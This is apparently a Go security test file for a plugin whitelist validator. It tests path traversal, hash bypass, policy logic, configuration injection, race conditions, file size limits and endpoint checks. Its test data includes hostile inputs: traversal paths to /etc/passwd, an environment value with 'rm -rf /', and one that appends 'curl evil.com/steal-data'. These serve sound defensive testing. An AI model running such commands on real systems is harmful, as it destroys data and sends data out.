// plugin_whitelist_security_test.go: Security Tests for Plugin Whitelist Validation
//
// Copyright (c) 2025 AGILira - A. Giordano
// Series: an AGILira library
// SPDX-License-Identifier: MPL-2.0

package goplugins

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestSecurityValidator_PathTraversalAttacks tests vulnerabilities to path traversal
func TestSecurityValidator_PathTraversalAttacks(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create a legitimate file that should be accessible
	validFile := filepath.Join(tempDir, "valid.so")
	validContent := []byte("valid plugin content")
	if err := os.WriteFile(validFile, validContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Create a "secret" file outside of tempDir that the attacker wants to read
	secretDir := filepath.Join(tempDir, "secret")
	if err := os.MkdirAll(secretDir, 0755); err != nil {
		t.Fatal(err)
	}
	secretFile := filepath.Join(secretDir, "sensitive.txt")
	secretContent := []byte("SECRET_API_KEY=12345")
	if err := os.WriteFile(secretFile, secretContent, 0644); err != nil {
		t.Fatal(err)
	}

	config := SecurityConfig{
		Enabled:       true,
		Policy:        SecurityPolicyStrict,
		HashAlgorithm: HashAlgorithmSHA256,
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	// Test path traversal attacks - these should FAIL for security
	pathTraversalAttempts := []struct {
		name          string
		maliciousPath string
		expectError   bool
		description   string
	}{
		{
			name:          "basic_dotdot_attack",
			maliciousPath: filepath.Join(tempDir, "..", "..", "etc", "passwd"),
			expectError:   true,
			description:   "Should reject ../ path traversal",
		},
		{
			name:          "relative_path_attack",
			maliciousPath: "../secret/sensitive.txt",
			expectError:   true,
			description:   "Should reject relative paths with ..",
		},
		{
			name:          "nested_dotdot_attack",
			maliciousPath: filepath.Join(tempDir, "subdir", "..", "..", "secret", "sensitive.txt"),
			expectError:   true,
			description:   "Should reject nested ../ sequences",
		},
		{
			name:          "encoded_dotdot_attack",
			maliciousPath: strings.Replace("../secret/sensitive.txt", "..", "%2e%2e", -1),
			expectError:   true,
			description:   "Should reject URL-encoded path traversal",
		},
		{
			name:          "valid_file_access",
			maliciousPath: validFile,
			expectError:   false,
			description:   "Should allow legitimate file access",
		},
	}

	for _, tt := range pathTraversalAttempts {
		t.Run(tt.name, func(t *testing.T) {
			_, err := validator.calculateFileHash(tt.maliciousPath)

			if tt.expectError {
				if err == nil {
					t.Errorf("SECURITY VULNERABILITY: Path traversal attack succeeded! Path: %s", tt.maliciousPath)
				}
				// Verifica che l'errore sia specificamente per path invalido
				if err != nil && !strings.Contains(err.Error(), "invalid file path") {
					t.Logf("Good: Path rejected, but check error type: %v", err)
				}
			} else {
				if err != nil {
					t.Errorf("Legitimate file access failed: %v", err)
				}
			}
		})
	}
}

// TestSecurityValidator_HashBypassAttempts tests attempts to bypass hash validation
func TestSecurityValidator_HashBypassAttempts(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create original plugin file
	originalContent := []byte("legitimate plugin code")
	originalFile := filepath.Join(tempDir, "original.so")
	if err := os.WriteFile(originalFile, originalContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Calculate legitimate hash
	hasher := sha256.New()
	hasher.Write(originalContent)
	legitimateHash := hex.EncodeToString(hasher.Sum(nil))

	// Create malicious plugin file with different content
	maliciousContent := []byte("malicious code that steals data")
	maliciousFile := filepath.Join(tempDir, "malicious.so")
	if err := os.WriteFile(maliciousFile, maliciousContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Setup whitelist with legitimate hash
	whitelistFile := filepath.Join(tempDir, "whitelist.json")
	whitelist := PluginWhitelist{
		Version:       "1.0.0",
		UpdatedAt:     time.Now(),
		HashAlgorithm: HashAlgorithmSHA256,
		Plugins: map[string]PluginHashInfo{
			"test-plugin": {
				Name:      "test-plugin",
				Type:      "http",
				Algorithm: HashAlgorithmSHA256,
				Hash:      legitimateHash,
				AddedAt:   time.Now(),
				UpdatedAt: time.Now(),
			},
		},
	}

	whitelistData, err := json.Marshal(whitelist)
	if err != nil {
		t.Fatalf("Failed to marshal whitelist data: %v", err)
	}
	if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
		t.Fatal(err)
	}

	config := SecurityConfig{
		Enabled:       true,
		Policy:        SecurityPolicyStrict,
		WhitelistFile: whitelistFile,
		HashAlgorithm: HashAlgorithmSHA256,
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	// Enable validator if not already enabled
	if !validator.IsEnabled() {
		if err := validator.Enable(); err != nil {
			t.Fatal(err)
		}
	}

	// Test bypass attempts
	bypassAttempts := []struct {
		name            string
		pluginPath      string
		shouldBeBlocked bool
		description     string
	}{
		{
			name:            "legitimate_plugin",
			pluginPath:      originalFile,
			shouldBeBlocked: false,
			description:     "Legitimate plugin should be allowed",
		},
		{
			name:            "malicious_plugin_replacement",
			pluginPath:      maliciousFile,
			shouldBeBlocked: true,
			description:     "Malicious plugin with wrong hash should be blocked",
		},
	}

	for _, tt := range bypassAttempts {
		t.Run(tt.name, func(t *testing.T) {
			pluginConfig := PluginConfig{
				Name: "test-plugin",
				Type: "http",
			}

			result, err := validator.ValidatePlugin(pluginConfig, tt.pluginPath)
			if err != nil {
				t.Errorf("Validation error: %v", err)
				return
			}

			if tt.shouldBeBlocked {
				if result.Authorized {
					t.Errorf("SECURITY VULNERABILITY: Malicious plugin was authorized! This is a critical bug.")
				}
				if len(result.Violations) == 0 {
					t.Errorf("Expected security violations for malicious plugin")
				}
				// Verifica che sia specifically hash mismatch
				foundHashViolation := false
				for _, violation := range result.Violations {
					if violation.Type == "hash_mismatch" {
						foundHashViolation = true
						break
					}
				}
				if !foundHashViolation {
					t.Errorf("Expected hash_mismatch violation, got: %+v", result.Violations)
				}
			} else {
				if !result.Authorized {
					t.Errorf("Legitimate plugin was blocked: %+v", result.Violations)
				}
			}
		})
	}
}

// TestSecurityValidator_PolicyBypassLogic tests the logic of security policies
func TestSecurityValidator_PolicyBypassLogic(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create malicious plugin
	maliciousContent := []byte("backdoor payload")
	maliciousFile := filepath.Join(tempDir, "backdoor.so")
	if err := os.WriteFile(maliciousFile, maliciousContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Create empty whitelist (plugin not whitelisted)
	whitelistFile := filepath.Join(tempDir, "empty_whitelist.json")
	emptyWhitelist := PluginWhitelist{
		Version:       "1.0.0",
		UpdatedAt:     time.Now(),
		HashAlgorithm: HashAlgorithmSHA256,
		Plugins:       make(map[string]PluginHashInfo),
	}
	whitelistData, err := json.Marshal(emptyWhitelist)
	if err != nil {
		t.Fatalf("Failed to marshal empty whitelist data: %v", err)
	}
	if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
		t.Fatal(err)
	}

	// Test different security policies
	policies := []struct {
		policy           SecurityPolicy
		expectAuthorized bool
		description      string
		criticalTest     bool
	}{
		{
			policy:           SecurityPolicyDisabled,
			expectAuthorized: false,
			description:      "Disabled policy should return error (security improvement)",
			criticalTest:     false,
		},
		{
			policy:           SecurityPolicyAuditOnly,
			expectAuthorized: true,
			description:      "Audit-only should allow but log (expected behavior)",
			criticalTest:     false,
		},
		{
			policy:           SecurityPolicyPermissive,
			expectAuthorized: true,
			description:      "Permissive should allow but warn (expected behavior)",
			criticalTest:     false,
		},
		{
			policy:           SecurityPolicyStrict,
			expectAuthorized: false,
			description:      "Strict policy should BLOCK unlisted plugins (CRITICAL)",
			criticalTest:     true,
		},
	}

	for _, tt := range policies {
		t.Run(fmt.Sprintf("policy_%s", tt.policy.String()), func(t *testing.T) {
			config := SecurityConfig{
				Enabled:       true,
				Policy:        tt.policy,
				WhitelistFile: whitelistFile,
				HashAlgorithm: HashAlgorithmSHA256,
			}

			validator, err := NewSecurityValidator(config, logger)
			if err != nil {
				t.Fatal(err)
			}

			if !validator.IsEnabled() {
				if err := validator.Enable(); err != nil {
					t.Fatal(err)
				}
			}

			pluginConfig := PluginConfig{
				Name: "backdoor-plugin",
				Type: "http",
			}

			result, err := validator.ValidatePlugin(pluginConfig, maliciousFile)

			// Special handling for disabled policy (security improvement)
			if tt.policy == SecurityPolicyDisabled {
				if err == nil {
					t.Errorf("Disabled policy should return error (security improvement)")
				}
				if result != nil {
					t.Errorf("Disabled policy should not return result (security improvement)")
				}
				return
			}

			if err != nil {
				t.Errorf("Validation error: %v", err)
				return
			}

			if result.Authorized != tt.expectAuthorized {
				if tt.criticalTest && result.Authorized {
					t.Errorf("CRITICAL SECURITY BUG: Strict policy authorized unwhitelisted plugin! This allows arbitrary code execution.")
				} else {
					t.Errorf("Policy %s: expected authorized=%v, got %v", tt.policy.String(), tt.expectAuthorized, result.Authorized)
				}
			}

			// Per strict policy, deve avere violations
			if tt.policy == SecurityPolicyStrict && len(result.Violations) == 0 {
				t.Errorf("Strict policy should generate violations for unwhitelisted plugin")
			}
		})
	}
}

// TestSecurityValidator_ConfigInjectionAttacks tests configuration injection attacks
func TestSecurityValidator_ConfigInjectionAttacks(t *testing.T) {
	// Test ENV variable injection attacks
	injectionTests := []struct {
		name      string
		envKey    string
		envValue  string
		checkFunc func(*testing.T, *SecurityConfig)
	}{
		{
			name:     "policy_injection_attempt",
			envKey:   "GOPLUGINS_SECURITY_POLICY",
			envValue: "strict; rm -rf /; echo disabled",
			checkFunc: func(t *testing.T, config *SecurityConfig) {
				// Should reject malicious input and fall back to default (disabled)
				if config.Policy == SecurityPolicyDisabled {
					t.Logf("EXCELLENT: Injection rejected correctly, fallback to default policy (disabled)")
				} else {
					t.Errorf("VULNERABILITY: Malicious policy input was parsed! Got policy: %v", config.Policy)
				}
			},
		},
		{
			name:     "path_injection_attempt",
			envKey:   "GOPLUGINS_WHITELIST_FILE",
			envValue: "/etc/passwd; curl evil.com/steal-data",
			checkFunc: func(t *testing.T, config *SecurityConfig) {
				// Should not execute curl command
				if strings.Contains(config.WhitelistFile, "curl") {
					t.Logf("WARNING: Suspicious command in file path: %s", config.WhitelistFile)
				}
			},
		},
		{
			name:     "boolean_injection",
			envKey:   "GOPLUGINS_SECURITY_ENABLED",
			envValue: "true && malicious_command",
			checkFunc: func(t *testing.T, config *SecurityConfig) {
				// Should parse as boolean, not execute commands
				if config.Enabled {
					t.Logf("Boolean parsing worked correctly")
				}
			},
		},
	}

	for _, tt := range injectionTests {
		t.Run(tt.name, func(t *testing.T) {
			// Set malicious env var
			originalValue := os.Getenv(tt.envKey)
			_ = os.Setenv(tt.envKey, tt.envValue)
			defer func() {
				if originalValue == "" {
					_ = os.Unsetenv(tt.envKey)
				} else {
					_ = os.Setenv(tt.envKey, originalValue)
				}
			}()

			config, err := LoadSecurityConfigFromEnv()
			if err != nil {
				t.Errorf("Config loading failed: %v", err)
				return
			}

			tt.checkFunc(t, config)
		})
	}
}

// TestSecurityValidator_RaceConditionExploits tests race conditions in validation
func TestSecurityValidator_RaceConditionExploits(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create plugin file
	pluginContent := []byte("race condition test plugin")
	pluginFile := filepath.Join(tempDir, "race.so")
	if err := os.WriteFile(pluginFile, pluginContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Calculate correct hash
	hasher := sha256.New()
	hasher.Write(pluginContent)
	correctHash := hex.EncodeToString(hasher.Sum(nil))

	// Setup whitelist
	whitelistFile := filepath.Join(tempDir, "whitelist.json")
	whitelist := PluginWhitelist{
		Version:       "1.0.0",
		UpdatedAt:     time.Now(),
		HashAlgorithm: HashAlgorithmSHA256,
		Plugins: map[string]PluginHashInfo{
			"race-plugin": {
				Name:      "race-plugin",
				Type:      "http",
				Algorithm: HashAlgorithmSHA256,
				Hash:      correctHash,
				AddedAt:   time.Now(),
				UpdatedAt: time.Now(),
			},
		},
	}
	whitelistData, err := json.Marshal(whitelist)
	if err != nil {
		t.Fatalf("Failed to marshal whitelist data: %v", err)
	}
	if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
		t.Fatal(err)
	}

	config := SecurityConfig{
		Enabled:       true,
		Policy:        SecurityPolicyStrict,
		WhitelistFile: whitelistFile,
		HashAlgorithm: HashAlgorithmSHA256,
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	if !validator.IsEnabled() {
		if err := validator.Enable(); err != nil {
			t.Fatal(err)
		}
	}

	// Simulate concurrent validation attempts (race condition test)
	concurrency := 50
	results := make(chan *ValidationResult, concurrency)
	errors := make(chan error, concurrency)

	pluginConfig := PluginConfig{
		Name: "race-plugin",
		Type: "http",
	}

	// Launch concurrent validations
	for i := 0; i < concurrency; i++ {
		go func() {
			result, err := validator.ValidatePlugin(pluginConfig, pluginFile)
			if err != nil {
				errors <- err
				return
			}
			results <- result
		}()
	}

	// Collect results
	authorizedCount := 0
	rejectedCount := 0

	for i := 0; i < concurrency; i++ {
		select {
		case result := <-results:
			if result.Authorized {
				authorizedCount++
			} else {
				rejectedCount++
			}
		case err := <-errors:
			t.Errorf("Validation error in race condition: %v", err)
		case <-time.After(5 * time.Second):
			t.Fatal("Timeout in race condition test")
		}
	}

	// All validations should have the same result (no race condition)
	if authorizedCount > 0 && rejectedCount > 0 {
		t.Errorf("RACE CONDITION DETECTED: Mixed results - authorized: %d, rejected: %d",
			authorizedCount, rejectedCount)
	}

	// With valid plugin and hash, all should be authorized
	if authorizedCount != concurrency {
		t.Errorf("Expected all %d validations to be authorized, got %d", concurrency, authorizedCount)
	}

	// Verify stats consistency (allow small variance due to race conditions)
	stats := validator.GetStats()
	minExpected := int64(concurrency - 2) // Allow small variance for race conditions
	maxExpected := int64(concurrency + 2) // Allow small variance for race conditions
	if stats.ValidationAttempts < minExpected || stats.ValidationAttempts > maxExpected {
		t.Errorf("Stats race condition: expected %d±2 attempts, got %d", concurrency, stats.ValidationAttempts)
	}
}

// TestSecurityValidator_ResourceExhaustionAttacks tests resource exhaustion attacks
func TestSecurityValidator_ResourceExhaustionAttacks(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create oversized "plugin" file (simulated large malicious file)
	oversizedFile := filepath.Join(tempDir, "huge.so")

	// Create 1MB file (smaller than 100MB default but we'll set lower limit)
	largeContent := make([]byte, 1024*1024) // 1MB
	for i := range largeContent {
		largeContent[i] = byte(i % 256)
	}
	if err := os.WriteFile(oversizedFile, largeContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Setup whitelist with small file size limit
	whitelistFile := filepath.Join(tempDir, "whitelist.json")
	whitelist := PluginWhitelist{
		Version:       "1.0.0",
		UpdatedAt:     time.Now(),
		HashAlgorithm: HashAlgorithmSHA256,
		Plugins: map[string]PluginHashInfo{
			"huge-plugin": {
				Name:        "huge-plugin",
				Type:        "http",
				Algorithm:   HashAlgorithmSHA256,
				Hash:        "dummy-hash-for-size-test",
				MaxFileSize: 512 * 1024, // 512KB limit - should reject 1MB file
				AddedAt:     time.Now(),
				UpdatedAt:   time.Now(),
			},
		},
	}
	whitelistData, err := json.Marshal(whitelist)
	if err != nil {
		t.Fatalf("Failed to marshal whitelist data: %v", err)
	}
	if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
		t.Fatal(err)
	}

	config := SecurityConfig{
		Enabled:       true,
		Policy:        SecurityPolicyStrict,
		WhitelistFile: whitelistFile,
		HashAlgorithm: HashAlgorithmSHA256,
		MaxFileSize:   512 * 1024, // 512KB global limit
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	if !validator.IsEnabled() {
		if err := validator.Enable(); err != nil {
			t.Fatal(err)
		}
	}

	pluginConfig := PluginConfig{
		Name: "huge-plugin",
		Type: "http",
	}

	result, err := validator.ValidatePlugin(pluginConfig, oversizedFile)
	if err != nil {
		t.Errorf("Validation error: %v", err)
		return
	}

	// Should be rejected for file size
	if result.Authorized {
		t.Errorf("RESOURCE EXHAUSTION VULNERABILITY: Oversized file was authorized")
	}

	// Should have file size violation
	foundSizeViolation := false
	for _, violation := range result.Violations {
		if violation.Type == "file_size_exceeded" {
			foundSizeViolation = true
			t.Logf("Good: File size violation detected: %s", violation.Reason)
			break
		}
	}
	if !foundSizeViolation {
		t.Errorf("Expected file_size_exceeded violation, got: %+v", result.Violations)
	}
}

// TestSecurityValidator_MissingFunctions tests functions with 0% coverage
func TestSecurityValidator_MissingFunctions(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Setup base validator - start DISABLED
	config := SecurityConfig{
		Enabled:       false, // Start disabled for testing
		Policy:        SecurityPolicyStrict,
		HashAlgorithm: HashAlgorithmSHA256,
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	t.Run("Disable_Function", func(t *testing.T) {
		// Create fresh validator for this test - start DISABLED
		testConfig := SecurityConfig{
			Enabled:       false, // Start disabled for testing
			Policy:        SecurityPolicyStrict,
			HashAlgorithm: HashAlgorithmSHA256,
		}
		testValidator, err := NewSecurityValidator(testConfig, logger)
		if err != nil {
			t.Fatal(err)
		}

		// Enable first
		if err := testValidator.Enable(); err != nil {
			t.Fatal(err)
		}

		// Verify enabled
		if !testValidator.IsEnabled() {
			t.Error("Validator should be enabled")
		}

		// Test Disable
		if err := testValidator.Disable(); err != nil {
			t.Errorf("Disable failed: %v", err)
		}

		// Verify disabled
		if testValidator.IsEnabled() {
			t.Error("Validator should be disabled after Disable()")
		}

		// Test double disable (should return error)
		if err := testValidator.Disable(); err == nil {
			t.Error("Double disable should return error")
		}
	})

	t.Run("GetConfig_Function", func(t *testing.T) {
		// Test GetConfig
		retrievedConfig := validator.GetConfig()

		// Verify configuration fields
		if retrievedConfig.Policy != SecurityPolicyStrict {
			t.Errorf("Expected policy %v, got %v", SecurityPolicyStrict, retrievedConfig.Policy)
		}
		if retrievedConfig.HashAlgorithm != HashAlgorithmSHA256 {
			t.Errorf("Expected hash algorithm %v, got %v", HashAlgorithmSHA256, retrievedConfig.HashAlgorithm)
		}
		// Verify the config matches what we set (disabled initially)
		if retrievedConfig.Enabled {
			t.Error("Expected config to show enabled=false (as we set it)")
		}
	})

	t.Run("GetWhitelistInfo_Function", func(t *testing.T) {
		// Create fresh validator for this test - start DISABLED
		testConfig := SecurityConfig{
			Enabled:       false, // Start disabled for testing
			Policy:        SecurityPolicyStrict,
			HashAlgorithm: HashAlgorithmSHA256,
		}
		testValidator, err := NewSecurityValidator(testConfig, logger)
		if err != nil {
			t.Fatal(err)
		}

		// Test GetWhitelistInfo with no whitelist loaded
		info := testValidator.GetWhitelistInfo()

		// Should indicate no whitelist loaded
		loaded, exists := info["loaded"]
		if !exists {
			t.Error("GetWhitelistInfo should return 'loaded' field")
		}
		if loaded != false {
			t.Error("Expected loaded=false when no whitelist loaded")
		}

		// Load a whitelist and test again
		whitelistFile := filepath.Join(tempDir, "test_whitelist.json")
		whitelist := PluginWhitelist{
			Version:       "2.0.0",
			UpdatedAt:     time.Now(),
			HashAlgorithm: HashAlgorithmSHA256,
			Plugins: map[string]PluginHashInfo{
				"test-plugin": {
					Name:      "test-plugin",
					Type:      "http",
					Algorithm: HashAlgorithmSHA256,
					Hash:      "dummy-hash",
					AddedAt:   time.Now(),
					UpdatedAt: time.Now(),
				},
			},
		}
		whitelistData, err := json.Marshal(whitelist)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
			t.Fatal(err)
		}

		// Update config with whitelist file
		newConfig := testConfig
		newConfig.WhitelistFile = whitelistFile
		if updateErr := testValidator.UpdateConfig(newConfig); updateErr != nil {
			t.Fatalf("Failed to update config: %v", updateErr)
		}

		// Enable to load whitelist
		if err := testValidator.Enable(); err != nil {
			t.Fatal(err)
		}

		// Test GetWhitelistInfo with loaded whitelist
		infoLoaded := testValidator.GetWhitelistInfo()
		if infoLoaded["loaded"] != true {
			t.Error("Expected loaded=true after loading whitelist")
		}
		if infoLoaded["version"] != "2.0.0" {
			t.Errorf("Expected version 2.0.0, got %v", infoLoaded["version"])
		}
		if infoLoaded["plugin_count"] != 1 {
			t.Errorf("Expected plugin_count 1, got %v", infoLoaded["plugin_count"])
		}
		if infoLoaded["hash_algorithm"] != HashAlgorithmSHA256 {
			t.Errorf("Expected hash_algorithm %v, got %v", HashAlgorithmSHA256, infoLoaded["hash_algorithm"])
		}
	})

	t.Run("ReloadWhitelist_Function", func(t *testing.T) {
		// Create fresh validator for this subtest
		testConfig := SecurityConfig{
			Enabled:       false, // Start disabled
			Policy:        SecurityPolicyStrict,
			HashAlgorithm: HashAlgorithmSHA256,
		}
		freshValidator, err := NewSecurityValidator(testConfig, logger)
		if err != nil {
			t.Fatal(err)
		}

		// Verify it's actually disabled after creation
		if freshValidator.IsEnabled() {
			t.Errorf("Fresh validator should be disabled, but IsEnabled() returned true")
		}

		// Test ReloadWhitelist when disabled (should fail)
		if err := freshValidator.ReloadWhitelist(); err == nil {
			t.Error("ReloadWhitelist should fail when validator disabled")
		} else {
			t.Logf("Good: ReloadWhitelist correctly failed with: %v", err)
		}

		// Test ReloadWhitelist when enabled but no whitelist file
		configNoFile := SecurityConfig{
			Enabled:       false, // Start disabled then enable
			Policy:        SecurityPolicyStrict,
			HashAlgorithm: HashAlgorithmSHA256,
			// No WhitelistFile set
		}
		validatorNoFile, err := NewSecurityValidator(configNoFile, &testLogger{t: t})
		if err != nil {
			t.Fatal(err)
		}
		if err := validatorNoFile.Enable(); err != nil {
			t.Fatal(err)
		}

		if err := validatorNoFile.ReloadWhitelist(); err == nil {
			t.Error("ReloadWhitelist should fail when no whitelist file configured")
		}

		// Test successful ReloadWhitelist
		whitelistFile := filepath.Join(tempDir, "reload_test.json")
		initialWhitelist := PluginWhitelist{
			Version:       "1.0.0",
			UpdatedAt:     time.Now(),
			HashAlgorithm: HashAlgorithmSHA256,
			Plugins: map[string]PluginHashInfo{
				"plugin1": {
					Name:      "plugin1",
					Type:      "http",
					Algorithm: HashAlgorithmSHA256,
					Hash:      "hash1",
					AddedAt:   time.Now(),
					UpdatedAt: time.Now(),
				},
			},
		}
		initialData, err := json.Marshal(initialWhitelist)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(whitelistFile, initialData, 0644); err != nil {
			t.Fatal(err)
		}

		// Create validator with whitelist file - start DISABLED
		configWithFile := SecurityConfig{
			Enabled:       false, // Start disabled
			Policy:        SecurityPolicyStrict,
			HashAlgorithm: HashAlgorithmSHA256,
			WhitelistFile: whitelistFile,
		}
		validatorWithFile, err := NewSecurityValidator(configWithFile, logger)
		if err != nil {
			t.Fatal(err)
		}
		if err := validatorWithFile.Enable(); err != nil {
			t.Fatal(err)
		}

		// Verify initial state
		info := validatorWithFile.GetWhitelistInfo()
		if info["plugin_count"] != 1 {
			t.Errorf("Expected 1 plugin initially, got %v", info["plugin_count"])
		}

		// Modify whitelist file
		updatedWhitelist := PluginWhitelist{
			Version:       "2.0.0",
			UpdatedAt:     time.Now(),
			HashAlgorithm: HashAlgorithmSHA256,
			Plugins: map[string]PluginHashInfo{
				"plugin1": {
					Name:      "plugin1",
					Type:      "http",
					Algorithm: HashAlgorithmSHA256,
					Hash:      "hash1",
					AddedAt:   time.Now(),
					UpdatedAt: time.Now(),
				},
				"plugin2": {
					Name:      "plugin2",
					Type:      "grpc",
					Algorithm: HashAlgorithmSHA256,
					Hash:      "hash2",
					AddedAt:   time.Now(),
					UpdatedAt: time.Now(),
				},
			},
		}
		updatedData, err := json.Marshal(updatedWhitelist)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(whitelistFile, updatedData, 0644); err != nil {
			t.Fatal(err)
		}

		// Test ReloadWhitelist
		if err := validatorWithFile.ReloadWhitelist(); err != nil {
			t.Errorf("ReloadWhitelist failed: %v", err)
		}

		// Verify reload worked
		infoAfterReload := validatorWithFile.GetWhitelistInfo()
		if infoAfterReload["plugin_count"] != 2 {
			t.Errorf("Expected 2 plugins after reload, got %v", infoAfterReload["plugin_count"])
		}
		if infoAfterReload["version"] != "2.0.0" {
			t.Errorf("Expected version 2.0.0 after reload, got %v", infoAfterReload["version"])
		}
	})
}

// TestSecurityValidator_EndpointValidation testa la validazione degli endpoint (basso coverage)
func TestSecurityValidator_EndpointValidation(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create test plugin file
	pluginContent := []byte("endpoint test plugin")
	pluginFile := filepath.Join(tempDir, "endpoint.so")
	if err := os.WriteFile(pluginFile, pluginContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Calculate hash
	hasher := sha256.New()
	hasher.Write(pluginContent)
	correctHash := hex.EncodeToString(hasher.Sum(nil))

	// Test cases for endpoint validation
	testCases := []struct {
		name             string
		allowedEndpoints []string
		pluginEndpoint   string
		expectAuthorized bool
		expectViolation  bool
		violationType    string
		description      string
	}{
		{
			name:             "no_endpoint_restriction",
			allowedEndpoints: []string{}, // Empty list = no restriction
			pluginEndpoint:   "https://any-endpoint.com",
			expectAuthorized: true,
			expectViolation:  false,
			description:      "Empty allowed endpoints should allow any endpoint",
		},
		{
			name:             "matching_endpoint_allowed",
			allowedEndpoints: []string{"https://api.example.com", "https://backup.example.com"},
			pluginEndpoint:   "https://api.example.com",
			expectAuthorized: true,
			expectViolation:  false,
			description:      "Matching endpoint should be allowed",
		},
		{
			name:             "non_matching_endpoint_blocked",
			allowedEndpoints: []string{"https://api.example.com", "https://backup.example.com"},
			pluginEndpoint:   "https://malicious.hacker.com",
			expectAuthorized: false,
			expectViolation:  true,
			violationType:    "endpoint_not_allowed",
			description:      "Non-matching endpoint should be blocked",
		},
		{
			name:             "empty_plugin_endpoint",
			allowedEndpoints: []string{"https://api.example.com"},
			pluginEndpoint:   "", // Empty endpoint
			expectAuthorized: true,
			expectViolation:  false,
			description:      "Empty plugin endpoint should be allowed (no validation)",
		},
		{
			name:             "case_sensitive_endpoint",
			allowedEndpoints: []string{"https://API.EXAMPLE.COM"},
			pluginEndpoint:   "https://api.example.com",
			expectAuthorized: false,
			expectViolation:  true,
			violationType:    "endpoint_not_allowed",
			description:      "Endpoint validation should be case-sensitive",
		},
		{
			name:             "partial_match_blocked",
			allowedEndpoints: []string{"https://api.example.com"},
			pluginEndpoint:   "https://api.example.com.malicious.com",
			expectAuthorized: false,
			expectViolation:  true,
			violationType:    "endpoint_not_allowed",
			description:      "Partial matches should be blocked (prevent subdomain attacks)",
		},
	}

	for _, tt := range testCases {
		t.Run(tt.name, func(t *testing.T) {
			// Setup whitelist with endpoint restrictions
			whitelistFile := filepath.Join(tempDir, fmt.Sprintf("whitelist_%s.json", tt.name))
			whitelist := PluginWhitelist{
				Version:       "1.0.0",
				UpdatedAt:     time.Now(),
				HashAlgorithm: HashAlgorithmSHA256,
				Plugins: map[string]PluginHashInfo{
					"endpoint-test-plugin": {
						Name:             "endpoint-test-plugin",
						Type:             "http",
						Algorithm:        HashAlgorithmSHA256,
						Hash:             correctHash,
						AllowedEndpoints: tt.allowedEndpoints,
						AddedAt:          time.Now(),
						UpdatedAt:        time.Now(),
					},
				},
			}

			whitelistData, err := json.Marshal(whitelist)
			if err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
				t.Fatal(err)
			}

			// Setup validator with fresh instance - start DISABLED
			testConfig := SecurityConfig{
				Enabled:       false, // Start disabled for testing
				Policy:        SecurityPolicyStrict,
				WhitelistFile: whitelistFile,
				HashAlgorithm: HashAlgorithmSHA256,
			}

			testValidator, err := NewSecurityValidator(testConfig, logger)
			if err != nil {
				t.Fatal(err)
			}

			if err := testValidator.Enable(); err != nil {
				t.Fatal(err)
			} // Test validation
			pluginConfig := PluginConfig{
				Name:     "endpoint-test-plugin",
				Type:     "http",
				Endpoint: tt.pluginEndpoint,
			}

			result, err := testValidator.ValidatePlugin(pluginConfig, pluginFile)
			if err != nil {
				t.Errorf("Validation error: %v", err)
				return
			}

			// Check authorization result
			if result.Authorized != tt.expectAuthorized {
				t.Errorf("%s: Expected authorized=%v, got %v", tt.description, tt.expectAuthorized, result.Authorized)
			}

			// Check violations
			if tt.expectViolation {
				foundExpectedViolation := false
				for _, violation := range result.Violations {
					if violation.Type == tt.violationType {
						foundExpectedViolation = true
						t.Logf("Good: Found expected violation: %s - %s", violation.Type, violation.Reason)

						// Verify violation context
						if violation.Plugin != "endpoint-test-plugin" {
							t.Errorf("Expected violation plugin 'endpoint-test-plugin', got '%s'", violation.Plugin)
						}
						if violation.Actual != tt.pluginEndpoint {
							t.Errorf("Expected violation actual '%s', got '%s'", tt.pluginEndpoint, violation.Actual)
						}
						break
					}
				}
				if !foundExpectedViolation {
					t.Errorf("%s: Expected violation type '%s' not found. Got violations: %+v", tt.description, tt.violationType, result.Violations)
				}
			} else {
				// Should not have endpoint violations
				for _, violation := range result.Violations {
					if violation.Type == "endpoint_not_allowed" {
						t.Errorf("%s: Unexpected endpoint violation: %s", tt.description, violation.Reason)
					}
				}
			}
		})
	}
}

// TestSecurityValidator_DefaultSecurityConfig testa la configurazione di default
func TestSecurityValidator_DefaultSecurityConfig(t *testing.T) {
	config := DefaultSecurityConfig()

	// Verify default values for security
	if config.Enabled {
		t.Error("Default config should be disabled for backward compatibility")
	}
	if config.Policy != SecurityPolicyDisabled {
		t.Errorf("Expected default policy %v, got %v", SecurityPolicyDisabled, config.Policy)
	}
	if config.HashAlgorithm != HashAlgorithmSHA256 {
		t.Errorf("Expected default hash algorithm %v, got %v", HashAlgorithmSHA256, config.HashAlgorithm)
	}
	if !config.ValidateOnStart {
		t.Error("Default config should validate on start")
	}
